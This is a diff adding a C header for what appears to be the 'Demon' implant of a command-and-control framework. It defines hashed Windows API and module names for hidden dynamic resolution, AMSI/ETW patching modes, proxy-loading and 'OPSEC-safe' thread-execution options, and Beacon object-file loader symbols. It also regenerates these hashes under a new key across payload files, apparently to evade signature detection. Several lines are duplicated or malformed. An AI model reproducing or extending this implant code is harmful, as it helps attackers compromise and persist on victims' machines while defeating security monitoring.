@@ -1,0 +1,450 @@
+#ifndef DEMON_STRINGS_H
+#define DEMON_STRINGS_H
+
+#include "MagicPool.h"
+
+#define PROCESS_ARCH_UNKNOWN                            0
+#define PROCESS_ARCH_X86                                        1
+#define PROCESS_ARCH_X64                                        2
+#define PROCESS_ARCH_IA64                                       3
+
+#ifdef _WIN64
+#define PROCESS_AGENT_ARCH PROCESS_ARCH_X64
+#else
+#define PROCESS_AGENT_ARCH PROCESS_ARCH_X86
+#endif
+
+// Runtime magic value selection - consistent cached value
+#define DEMON_MAGIC_VALUE GetRuntimeMagicValue()
+
+// Legacy static value for compatibility
+#define DEMON_MAGIC_VALUE_STATIC 0xACCB32ED
+
+#define WIN_VERSION_UNKNOWN 0
+#define WIN_VERSION_XP      1
+#define WIN_VERSION_VISTA   2
+#define WIN_VERSION_2008    3
+#define WIN_VERSION_7       4
+#define WIN_VERSION_2008_R2 5
+#define WIN_VERSION_2008_R2 6
+#define WIN_VERSION_2012    7
+#define WIN_VERSION_8       8
+#define WIN_VERSION_8_1     8.1
+#define WIN_VERSION_2012_R2 9
+#define WIN_VERSION_10      10
+#define WIN_VERSION_2016_X  11
+
+#define LDR_GADGET_MODULE_SIZE ( 0x1000 * 0x1000 )
+#define LDR_GADGET_HEADER_SIZE ( 0x1000 )
+
+#define PROXYLOAD_NONE             0
+#define PROXYLOAD_RTLREGISTERWAIT  1
+#define PROXYLOAD_RTLCREATETIMER   2
+#define PROXYLOAD_RTLQUEUEWORKITEM 3
+
+#define AMSIETW_PATCH_NONE   0
+#define AMSIETW_PATCH_HWBP   1
+#define AMSIETW_PATCH_MEMORY 2
+
+/* Win32 Functions */
+#define H_FUNC_LDRLOADDLL                            0xec0718f7
+#define H_FUNC_LDRGETPROCEDUREADDRESS                0x125bdf89
+#define H_FUNC_NTADDBOOTENTRY                        0x6f568459
+#define H_FUNC_NTALLOCATEVIRTUALMEMORY               0x103b1c13
+#define H_FUNC_NTFREEVIRTUALMEMORY                   0x6b229075
+#define H_FUNC_NTUNMAPVIEWOFSECTION                  0x2f8814c7
+#define H_FUNC_NTSETINFORMATIONVIRTUALMEMORY         0xd4a17439
+#define H_FUNC_NTQUERYVIRTUALMEMORY                  0x84766a23
+#define H_FUNC_NTOPENPROCESSTOKEN                    0x962a62a3
+#define H_FUNC_NTOPENTHREADTOKEN                     0xf7974edf
+#define H_FUNC_NTQUERYOBJECT                         0x46d34e63
+#define H_FUNC_NTTRACEEVENT                          0x7ed817e5
+#define H_FUNC_NTOPENPROCESS                         0xcfdec13f
+#define H_FUNC_NTTERMINATEPROCESS                    0x49289357
+#define H_FUNC_NTOPENTHREAD                          0x57afbe43
+#define H_FUNC_NTSETCONTEXTTHREAD                    0x8cf70769
+#define H_FUNC_NTGETCONTEXTTHREAD                    0x72014901
+#define H_FUNC_NTCLOSE                               0x8f7dab25
+#define H_FUNC_NTCONTINUE                            0x4175e089
+#define H_FUNC_NTSETEVENT                            0x72e84f2b
+#define H_FUNC_NTCREATEEVENT                         0xc7227371
+#define H_FUNC_NTWAITFORSINGLEOBJECT                 0x10eaa88b
+#define H_FUNC_NTSIGNALANDWAITFORSINGLEOBJECT        0x7688b653
+#define H_FUNC_NTGETNEXTTHREAD                       0xbcf46f3b
+#define H_FUNC_NTRESUMETHREAD                        0x261ad169
+#define H_FUNC_NTSUSPENDTHREAD                       0x227863e1
+#define H_FUNC_NTDUPLICATEOBJECT                     0x9ab16509
+#define H_FUNC_NTQUERYINFORMATIONTHREAD              0xceefd377
+#define H_FUNC_NTCREATETHREADEX                      0x971853ed
+#define H_FUNC_NTQUEUEAPCTHREAD                      0x2aa7f3d5
+#define H_FUNC_NTQUERYSYSTEMINFORMATION              0xaba844e5
+#define H_FUNC_NTQUERYINFORMATIONTOKEN               0xe4e1ab7f
+#define H_FUNC_NTQUERYINFORMATIONPROCESS             0xcf467f4b
+#define H_FUNC_NTSETINFORMATIONTHREAD                0x81da6963
+#define H_FUNC_NTPROTECTVIRTUALMEMORY                0x95617115
+#define H_FUNC_NTREADVIRTUALMEMORY                   0x530ef3a1
+#define H_FUNC_NTTERMINATETHREAD                     0x6b9a32ab
+#define H_FUNC_NTWRITEVIRTUALMEMORY                  0x377d8475
+#define H_FUNC_NTDUPLICATETOKEN                      0x133a16b7
+#define H_FUNC_NTALERTRESUMETHREAD                   0x4641931b
+#define H_FUNC_NTTESTALERT                           0x8faff209
+#define H_FUNC_RTLALLOCATEHEAP                       0x4f4e56e7
+#define H_FUNC_RTLREALLOCATEHEAP                     0x748c7eed
+#define H_FUNC_RTLFREEHEAP                           0xe2839be5
+#define H_FUNC_RTLEXITUSERPROCESS                    0x38616b27
+#define H_FUNC_RTLRANDOMEX                           0x23658a21
+#define H_FUNC_RTLNTSTATUSTODOSERROR                 0x8b9363db
+#define H_FUNC_RTLGETVERSION                         0x44c54299
+#define H_FUNC_RTLADDVECTOREDEXCEPTIONHANDLER        0x6d7dfbb7
+#define H_FUNC_RTLREMOVEVECTOREDEXCEPTIONHANDLER     0x523bf577
+#define H_FUNC_RTLCREATETIMERQUEUE                   0x906477a5
+#define H_FUNC_RTLDELETETIMERQUEUE                   0x6d22f183
+#define H_FUNC_RTLCREATETIMER                        0xac86cb8d
+#define H_FUNC_RTLQUEUEWORKITEM                      0x3a471ae5
+#define H_FUNC_RTLREGISTERWAIT                       0x2e4002c5
+#define H_FUNC_RTLCAPTURECONTEXT                     0x1f2e6027
+#define H_FUNC_RTLCOPYMAPPEDMEMORY                   0x397987e7
+#define H_FUNC_RTLFILLMEMORY                         0x60b1c61d
+#define H_FUNC_RTLEXITUSERTHREAD                     0x75750ddb
+#define H_FUNC_RTLSUBAUTHORITYSID                    0x46aeabd1
+#define H_FUNC_RTLSUBAUTHORITYCOUNTSID               0x70f91719
+
+#define H_FUNC_LOADLIBRARYW                          0xd5127f53
+#define H_FUNC_GETCOMPUTERNAMEEXA                    0x8fb9f873
+#define H_FUNC_VIRTUALPROTECT                        0xd625b397
+#define H_FUNC_GETPROCADDRESS                        0xaa04c8ff
+#define H_FUNC_GETCURRENTDIRECTORYW                  0x5b6cfae9
+#define H_FUNC_FINDNEXTFILEW                         0x41bdf7df
+#define H_FUNC_FILETIMETOSYSTEMTIME                  0xe3c4c08f
+#define H_FUNC_OUTPUTDEBUGSTRINGA                    0xea8d72eb
+#define H_FUNC_DEBUGBREAK                            0x24f7f8a7
+#define H_FUNC_LOGONUSEREXW                          0xc66eca1b
+#define H_FUNC_VSNPRINTF                             0xdda9615
+#define H_FUNC_GETADAPTERSINFO                       0xd08940f1
+#define H_FUNC_WINHTTPOPEN                           0x6ff521dd
+#define H_FUNC_WINHTTPCONNECT                        0xd59a2e3b
+#define H_FUNC_WINHTTPOPENREQUEST                    0x2d866c91
+#define H_FUNC_WINHTTPSETOPTION                      0x84a67ed5
+#define H_FUNC_WINHTTPSENDREQUEST                    0x9fa9e5b5
+#define H_FUNC_WINHTTPRECEIVERESPONSE                0xc52895cf
+#define H_FUNC_WINHTTPADDREQUESTHEADERS              0xf1643ed7
+#define H_FUNC_WINHTTPREADDATA                       0x2bd79369
+#define H_FUNC_WINHTTPQUERYHEADERS                   0xd1f722c5
+#define H_FUNC_WINHTTPCLOSEHANDLE                    0x7c382d87
+#define H_FUNC_WINHTTPGETIEPROXYCONFIGFORCURRENTUSER 0xc00dc8bb
+#define H_FUNC_WINHTTPGETPROXYFORURL                 0x4699dbc5
+#define H_FUNC_VIRTUALPROTECTEX                      0xf4aa607d
+#define H_FUNC_LOCALALLOC                            0xe76618a3
+#define H_FUNC_LOCALREALLOC                          0x2b5eac3d
+#define H_FUNC_LOCALFREE                             0x24d1668f
+#define H_FUNC_CREATEREMOTETHREAD                    0x77f35927
+#define H_FUNC_CREATETOOLHELP32SNAPSHOT              0x33c7d09f
+#define H_FUNC_PROCESS32FIRSTW                       0xb1e7cb2b
+#define H_FUNC_PROCESS32NEXTW                        0xb4c6ddfb
+#define H_FUNC_THREAD32FIRST                         0x45a1266f
+#define H_FUNC_THREAD32NEXT                          0x3e48b367
+#define H_FUNC_OPENTHREAD                            0x88ca6ad7
+#define H_FUNC_CREATEPIPE                            0xdbde20a3
+#define H_FUNC_CREATEPROCESSW                        0x7bcac537
+#define H_FUNC_CREATEFILEW                           0x2214d01f
+#define H_FUNC_GETFULLPATHNAMEW                      0x9e651693
+#define H_FUNC_GETFILESIZE                           0x33fc87c7
+#define H_FUNC_GETFILESIZEEX                         0xca2edead
+#define H_FUNC_CREATENAMEDPIPEW                      0xd0ec6e67
+#define H_FUNC_CONVERTFIBERTOTHREAD                  0x6c40120b
+#define H_FUNC_CREATEFIBEREX                         0xf0c57827
+#define H_FUNC_READFILE                              0x6d0398f3
+#define H_FUNC_VIRTUALALLOCEX                        0x45370769
+#define H_FUNC_WAITFORSINGLEOBJECTEX                 0x428a981d
+#define H_FUNC_EXITPROCESS                           0xba155483
+#define H_FUNC_GETEXITCODEPROCESS                    0xe60dee4b
+#define H_FUNC_GETEXITCODETHREAD                     0x64727477
+#define H_FUNC_CONVERTTHREADTOFIBEREX                0x4ae51ffd
+#define H_FUNC_SWITCHTOFIBER                         0xbcaf9f7b
+#define H_FUNC_DELETEFIBER                           0x7ce4cd43
+#define H_FUNC_ALLOCCONSOLE                          0xe94e9db3
+#define H_FUNC_FREECONSOLE                           0xb37aac57
+#define H_FUNC_GETCONSOLEWINDOW                      0x738eb5b1
+#define H_FUNC_GETSTDHANDLE                          0x67fda679
+#define H_FUNC_SETSTDHANDLE                          0x47810ee1
+#define H_FUNC_WAITNAMEDPIPEW                        0x85ed2879
+#define H_FUNC_PEEKNAMEDPIPE                         0x44379759
+#define H_FUNC_DISCONNECTNAMEDPIPE                   0x89e72bd7
+#define H_FUNC_WRITEFILE                             0x19b3c7f7
+#define H_FUNC_CONNECTNAMEDPIPE                      0x5b851a29
+#define H_FUNC_FREELIBRARY                           0xc1d42bbf
+#define H_FUNC_GETFILEATTRIBUTESW                    0x1f29476b
+#define H_FUNC_FINDFIRSTFILEW                        0xa31e5c97
+#define H_FUNC_FINDCLOSE                             0x80bc0dff
+#define H_FUNC_SYSTEMTIMETOTZSPECIFICLOCALTIME       0xd8ac8373
+#define H_FUNC_REMOVEDIRECTORYW                      0x723a608b
+#define H_FUNC_DELETEFILEW                           0xcd2fdee1
+#define H_FUNC_CREATEDIRECTORYW                      0xe47c231b
+#define H_FUNC_COPYFILEW                             0xff74624d
+#define H_FUNC_MOVEFILEEXW                           0xab3a894f
+#define H_FUNC_SETCURRENTDIRECTORYW                  0x28c38f51
+
+// OPSEC-Safe Thread Execution Function Hashes
+#define H_FUNC_CREATETIMERQUEUE                      0xe2eb241f
+#define H_FUNC_CREATETIMERQUEUETIMER                 0xa7720b1b
+#define H_FUNC_DELETETIMERQUEUETIMER                 0x267a9d
+#define H_FUNC_DELETETIMERQUEUE                      0xbfa99dfd
+#define H_FUNC_ADDVECTOREDEXCEPTIONHANDLER           0xb5b58d1d
+#define H_FUNC_REMOVEVECTOREDEXCEPTIONHANDLER        0xaad01531
+#define H_FUNC_CREATETHREADPOOLWORK                  0x9315e0b5
+#define H_FUNC_SUBMITTHREADPOOLWORK                  0xe3ae8ed
+#define H_FUNC_WAITFORTHREADPOOLWORKCALLBACKS        0x3085ff35
+#define H_FUNC_CLOSETHREADPOOLWORK                   0xc67e597f
+#define H_FUNC_GETCURRENTTHREADID                    0x21018f5f
+#define H_FUNC_SETCURRENTDIRECTORYW                  0x28c38f51
+#define H_FUNC_WOW64DISABLEWOW64FSREDIRECTION        0x27615849
+#define H_FUNC_WOW64REVERTWOW64FSREDIRECTION         0xe7007187
+#define H_FUNC_GETMODULEHANDLEA                      0xd922a51d
+#define H_FUNC_GETSYSTEMTIMEASFILETIME               0x2d06a19b
+#define H_FUNC_GETLOCALTIME                          0xced32333
+#define H_FUNC_DUPLICATEHANDLE                       0xb7968387
+#define H_FUNC_ATTACHCONSOLE                         0x6fe93545
+#define H_FUNC_WRITECONSOLEA                         0xb6bbcab3
+#define H_FUNC_TERMINATEPROCESS                      0x6d13346b
+#define H_FUNC_GETTOKENINFORMATION                   0x8664f953
+#define H_FUNC_CREATEPROCESSWITHTOKENW               0x1375264f
+#define H_FUNC_CREATEPROCESSWITHLOGONW               0x86d9697b
+#define H_FUNC_REVERTTOSELF                          0x62bc7025
+#define H_FUNC_GETUSERNAMEA                          0x599846d9
+#define H_FUNC_LOGONUSERW                            0xf18979e1
+#define H_FUNC_LOOKUPACCOUNTSIDA                     0x93de1aed
+#define H_FUNC_LOOKUPACCOUNTSIDW                     0x93de1b19
+#define H_FUNC_OPENTHREADTOKEN                       0x4a09c88b
+#define H_FUNC_OPENPROCESSTOKEN                      0xba1503b7
+#define H_FUNC_ADJUSTTOKENPRIVILEGES                 0x5cf7bab9
+#define H_FUNC_LOOKUPPRIVILEGENAMEA                  0xeb7fb4ed
+#define H_FUNC_SYSTEMFUNCTION032                     0x69897fd1
+#define H_FUNC_FREESID                               0x283a8c25
+#define H_FUNC_SETSECURITYDESCRIPTORSACL             0xe3b6e71
+#define H_FUNC_SETSECURITYDESCRIPTORDACL             0xec56a2ef
+#define H_FUNC_INITIALIZESECURITYDESCRIPTOR          0x961f584d
+#define H_FUNC_ADDMANDATORYACE                       0xf41acbd7
+#define H_FUNC_INITIALIZEACL                         0x2e5486f5
+#define H_FUNC_ALLOCATEANDINITIALIZESID              0xaace8217
+#define H_FUNC_CHECKTOKENMEMBERSHIP                  0xbdd5c23d
+#define H_FUNC_SETENTRIESINACLW                      0xf7ce20af
+#define H_FUNC_SETTHREADTOKEN                        0xb96178e9
+#define H_FUNC_LSANTSTATUSTOWINERROR                 0x732df4f3
+#define H_FUNC_EQUALSID                              0xaf9bb803
+#define H_FUNC_CONVERTSIDTOSTRINGSIDW                0x47f21a4f
+#define H_FUNC_GETSIDSUBAUTHORITYCOUNT               0xd74ed989
+#define H_FUNC_GETSIDSUBAUTHORITY                    0xb4ceff45
+#define H_FUNC_LOOKUPPRIVILEGEVALUEA                 0x152ce18f
+#define H_FUNC_SAFEARRAYACCESSDATA                   0xe2238595
+#define H_FUNC_SAFEARRAYUNACCESSDATA                 0x3f54a4c7
+#define H_FUNC_SAFEARRAYCREATE                       0x56a845d1
+#define H_FUNC_SAFEARRAYPUTELEMENT                   0xf7557b93
+#define H_FUNC_SAFEARRAYCREATEVECTOR                 0x8a83f1b7
+#define H_FUNC_SAFEARRAYDESTROY                      0x85de24eb
+#define H_FUNC_SYSALLOCSTRING                        0xe12744c1
+#define H_FUNC_COMMANDLINETOARGVW                    0x9ee2609
+#define H_FUNC_SHOWWINDOW                            0xede7ab29
+#define H_FUNC_GETSYSTEMMETRICS                      0xa7001b8b
+#define H_FUNC_GETDC                                 0x91ae20cb
+#define H_FUNC_RELEASEDC                             0x911506ed
+#define H_FUNC_GETCURRENTOBJECT                      0x3db4b3b3
+#define H_FUNC_GETOBJECTW                            0xc208f513
+#define H_FUNC_CREATECOMPATIBLEDC                    0x1d72dbed
+#define H_FUNC_CREATEDIBSECTION                      0x7dd81737
+#define H_FUNC_SELECTOBJECT                          0x99c80e65
+#define H_FUNC_BITBLT                                0xed989909
+#define H_FUNC_DELETEOBJECT                          0x658b79c3
+#define H_FUNC_DELETEDC                              0x3fdd3843
+#define H_FUNC_SETPROCESSVALIDCALLTARGETS            0x568d6c39
+#define H_FUNC_CLRCREATEINSTANCE                     0xbd9bb0b5
+#define H_FUNC_NETLOCALGROUPENUM                     0x7def4f85
+#define H_FUNC_NETGROUPENUM                          0xe25e6415
+#define H_FUNC_NETUSERENUM                           0xf7798513
+#define H_FUNC_NETWKSTAUSERENUM                      0x6ae0ed05
+#define H_FUNC_NETSESSIONENUM                        0x65523f23
+#define H_FUNC_NETSHAREENUM                          0xdce87575
+#define H_FUNC_NETAPIBUFFERFREE                      0xdc92b341
+#define H_FUNC_WSASTARTUP                            0x41d45bdf
+#define H_FUNC_WSACLEANUP                            0x2bcdc60d
+#define H_FUNC_WSASOCKETA                            0x22bc80a1
+#define H_FUNC_WSAGETLASTERROR                       0xa59206e3
+#define H_FUNC_IOCTLSOCKET                           0x7fa2abf1
+#define H_FUNC_BIND                                  0xa389e8e9
+#define H_FUNC_LISTEN                                0x9e495b9d
+#define H_FUNC_ACCEPT                                0xfc0decdf
+#define H_FUNC_CLOSESOCKET                           0xa39ffc77
+#define H_FUNC_RECV                                  0xdf6c69b
+#define H_FUNC_SEND                                  0x76a2621f
+#define H_FUNC_CONNECT                               0x624ea35
+#define H_FUNC_GETADDRINFO                           0x72c5d2ab
+#define H_FUNC_FREEADDRINFO                          0x1cd925e5
+#define H_FUNC_LSAREGISTERLOGONPROCESS               0x3187d013
+#define H_FUNC_LSALOOKUPAUTHENTICATIONPACKAGE        0x1f4b3103
+#define H_FUNC_LSADEREGISTERLOGONPROCESS             0x234e0875
+#define H_FUNC_LSACONNECTUNTRUSTED                   0x790fe2dd
+#define H_FUNC_LSAFREERETURNBUFFER                   0x98db062d
+#define H_FUNC_LSACALLAUTHENTICATIONPACKAGE          0x7463c4fb
+#define H_FUNC_LSAGETLOGONSESSIONDATA                0x4b207781
+#define H_FUNC_LSAENUMERATELOGONSESSIONS             0xf962dd4d
+#define H_FUNC_SLEEP                                 0xd422494f
+#define H_FUNC_CREATETHREAD                          0xf5f1131b
+#define H_FUNC_AMSISCANBUFFER                        0x8a633c6d
+#define H_FUNC_GLOBALFREE                            0xe66a84ad
+#define H_FUNC_SWPRINTF_S                            0x8b9a3551
+
+
+// Beacon API
+#define H_COFFAPI_BEACONDATAPARSER                0xa8c0a1eb
+#define H_COFFAPI_BEACONDATAINT                   0x7e7272c3
+#define H_COFFAPI_BEACONDATASHORT                 0x24d977bd
+#define H_COFFAPI_BEACONDATALENGTH                0x4c2d9c57
+#define H_COFFAPI_BEACONDATAEXTRACT               0xeead1207
+
+#define H_COFFAPI_BEACONFORMATALLOC               0xd7b0b3d5
+#define H_COFFAPI_BEACONFORMATRESET               0x437e0a29
+#define H_COFFAPI_BEACONFORMATFREE                0xed9aca7d
+#define H_COFFAPI_BEACONFORMATAPPEND              0xf27179
+#define H_COFFAPI_BEACONFORMATPRINTF              0xb438fdb7
+#define H_COFFAPI_BEACONFORMATTOSTRING            0x16b90f3d
+#define H_COFFAPI_BEACONFORMATINT                 0x1a63dd09
+
+#define H_COFFAPI_BEACONPRINTF                    0x8b4dda49
+#define H_COFFAPI_BEACONOUTPUT                    0x2ae7b5f9
+#define H_COFFAPI_BEACONUSETOKEN                  0x178b3dbb
+#define H_COFFAPI_BEACONREVERTTOKEN               0xa0da1f23
+#define H_COFFAPI_BEACONISADMIN                   0xb2006b03
+#define H_COFFAPI_BEACONGETSPAWNTO                0xdbd79837
+#define H_COFFAPI_BEACONSPAWNTEMPORARYPROCESS     0xf7a59c6b
+#define H_COFFAPI_BEACONINJECTPROCESS             0x8a133bf5
+#define H_COFFAPI_BEACONINJECTTEMPORARYPROCESS    0x630e1c95
+#define H_COFFAPI_BEACONCLEANUPPROCESS            0xfb0f008d
+#define H_COFFAPI_BEACONINFORMATION               0xe2f4d5b1
+#define H_COFFAPI_BEACONADDVALUE                  0xafc47a57
+#define H_COFFAPI_BEACONGETVALUE                  0x82ed2aad
+#define H_COFFAPI_BEACONREMOVEVALUE               0x584795f3
+#define H_COFFAPI_BEACONDATASTOREGETITEM          0x18b977fb
+#define H_COFFAPI_BEACONDATASTOREPROTECTITEM      0x5449e2ad
+#define H_COFFAPI_BEACONDATASTOREUNPROTECTITEM    0x992ff25b
+#define H_COFFAPI_BEACONDATASTOREMAXENTRIES       0x44bb13f
+#define H_COFFAPI_BEACONGETCUSTOMUSERDATA         0x3b195051
+
+#define H_COFFAPI_TOWIDECHAR                      0x141894b7
+#define H_COFFAPI_LOADLIBRARYA                    0x2659cf67
+#define H_COFFAPI_GETPROCADDRESS                  0x140af0bf
+#define H_COFFAPI_GETMODULEHANDLE                 0xcfc6d09d
+#define H_COFFAPI_FREELIBRARY                     0xc87b977f
+#define H_COFFAPI_LOCALFREE                       0xce2b2acf
+
+#define H_COFFAPI_NTOPENTHREAD                    0xe8d93303
+#define H_COFFAPI_NTOPENPROCESS                   0x7fe498bf
+#define H_COFFAPI_NTTERMINATEPROCESS              0x6faacf97
+#define H_COFFAPI_NTOPENTHREADTOKEN               0xa3165e1f
+#define H_COFFAPI_NTOPENPROCESSTOKEN              0xc7806b23
+#define H_COFFAPI_NTDUPLICATETOKEN                0x880416f7
+#define H_COFFAPI_NTQUEUEAPCTHREAD                0x500ef055
+#define H_COFFAPI_NTSUSPENDTHREAD                 0xe31c1be1
+#define H_COFFAPI_NTRESUMETHREAD                  0x753ba29
+#define H_COFFAPI_NTCREATEEVENT                   0x2b5a82f1
+#define H_COFFAPI_NTCREATETHREADEX                0xf2ece4ed
+#define H_COFFAPI_NTDUPLICATEOBJECT               0xb28f6909
+#define H_COFFAPI_NTGETCONTEXTTHREAD              0x4fb94981
+#define H_COFFAPI_NTSETCONTEXTTHREAD              0x6aaf07e9
+#define H_COFFAPI_NTQUERYINFORMATIONPROCESS       0xbaca5b0b
+#define H_COFFAPI_NTQUERYSYSTEMINFORMATION        0x3315ace5
+#define H_COFFAPI_NTWAITFORSINGLEOBJECT           0xb8dfd08b
+#define H_COFFAPI_NTALLOCATEVIRTUALMEMORY         0x8696b3d3
+#define H_COFFAPI_NTWRITEVIRTUALMEMORY            0xdb4578f5
+#define H_COFFAPI_NTFREEVIRTUALMEMORY             0x103d1035
+#define H_COFFAPI_NTUNMAPVIEWOFSECTION            0x55b31487
+#define H_COFFAPI_NTPROTECTVIRTUALMEMORY          0x202ed995
+#define H_COFFAPI_NTREADVIRTUALMEMORY             0xf8297361
+#define H_COFFAPI_NTTERMINATETHREAD               0x837836ab
+#define H_COFFAPI_NTALERTRESUMETHREAD             0xfbfdf75b
+#define H_COFFAPI_NTSIGNALANDWAITFORSINGLEOBJECT  0x4adc7f13
+#define H_COFFAPI_NTQUERYVIRTUALMEMORY            0x283e5ea3
+#define H_COFFAPI_NTQUERYINFORMATIONTOKEN         0xbaffbb3f
+#define H_COFFAPI_NTQUERYINFORMATIONTHREAD        0x1caabff7
+#define H_COFFAPI_NTQUERYOBJECT                   0x680f3a63
+#define H_COFFAPI_NTCLOSE                         0x8e9ec6e5
+#define H_COFFAPI_NTSETINFORMATIONTHREAD          0x50ca61e3
+#define H_COFFAPI_NTSETINFORMATIONVIRTUALMEMORY   0x933c5439
+#define H_COFFAPI_NTGETNEXTTHREAD                 0xe789037b
+
+#define H_MODULE_KERNEL32                         0xd2fd8073
+#define H_MODULE_NTDLL                            0xee229e69
+#define H_MODULE_USER32                           0x1719e86f
+#define H_MODULE_KERNELBASE                       0xe109f5b7
+#define H_MODULE_WINMM                            0xf8a60ea5
+#define H_MODULE_WINSPOOL                         0x64927a41
+#define H_MODULE_MSIMG32                          0x1526d465
+#define H_MODULE_MPR                              0x11441ceb
+#define H_MODULE_NETAPI32                         0xc866c573
+
+#endif
+// =====================================================
+// New hashes for payloads/DllLdr/Include/Core.h
+// and payloads/Shellcode/Include/Core.h
+// Hash Key: 54383 (0xd46f)
+// =====================================================
+
+#define NTDLL_HASH                      0xee229e69 // ntdll.dll
+
+#define SYS_LDRLOADDLL                  0xec0718f7 // LDRLOADDLL
+#define SYS_NTALLOCATEVIRTUALMEMORY     0x103b1c13 // NTALLOCATEVIRTUALMEMORY
+#define SYS_NTPROTECTEDVIRTUALMEMORY    0x95617115 // NtProtectVirtualMemory
+#define SYS_NTFLUSHINSTRUCTIONCACHE     0x3762cf05 // NTFLUSHINSTRUCTIONCACHE
+
+// =====================================================
+// New Hashes for the ones in CoffeeLdr.c
+// Hash Key: 54383 (0xd46f)
+// =====================================================
+
+// BOF Symbol Recognition Hashes (x64)
+#if _WIN64
+    // __imp_
+    #define SYMB_COF        0x121e9db5 // HashEx without upper case, VALUE = __imp_
+    #define SYMB_COF_SIZE   6
+    // __imp_Beacon
+    #define PREP_COF        0x59eed95d // HashEx without upper case, VALUE = __imp_Beacon
+    #define PREP_COF_SIZE   ( SYMB_COF_SIZE + 6 )
+    // .refptr.Instance
+    #define INSTA_COF       0x94e9eb83 // HashEx without upper case, VALUE = .refptr.Instance
+#else
+    // __imp__
+    #define SYMB_COF        0xe381de59 // HashEx without upper case, VALUE = __imp__
+    #define SYMB_COF_SIZE   7
+    // __imp__Beacon
+    #define PREP_COF        0xce277881 // HashEx without upper case, VALUE = __imp__Beacon
+    #define PREP_COF_SIZE   ( SYMB_COF_SIZE + 6 )
+    // _Instance
+    #define INSTA_COF       0xe80d5ca9 // HashEx without upper case, VALUE = _Instance
+#endif
+
+// Note: These hashes are used for BOF symbol recognition and must match
+// the exact symbol strings used in COFF object files.
+
+// =====================================================
+// FILES TO MODIFY WHEN UPDATING HASH ALGORITHM
+// =====================================================
+//
+// Hash Algorithm Implementation:
+//   payloads/Demon/src/core/Win32.c
+//   payloads/Shellcode/Source/Utils.c
+//
+// Hash Constants (Generated by this tool):
+//   payloads/Demon/include/common/Defines.h
+//   payloads/DllLdr/Include/Core.h
+//   payloads/Shellcode/Include/Core.h
+//   payloads/Demon/src/core/CoffeeLdr.c
+//
+// Additional Hash References:
+//   payloads/Demon/include/core/Win32.h
+//   payloads/DllLdr/Include/Macro.h
+//
+// Search Patterns:
+//   CoffeeLdr.c: Search for '__imp_Beacon' patterns
+//   Core.h files: Search for 'SYS_' and 'H_FUNC_' prefixes
+//   Defines.h: Search for '0x' hash constants
+//
+// =====================================================
+
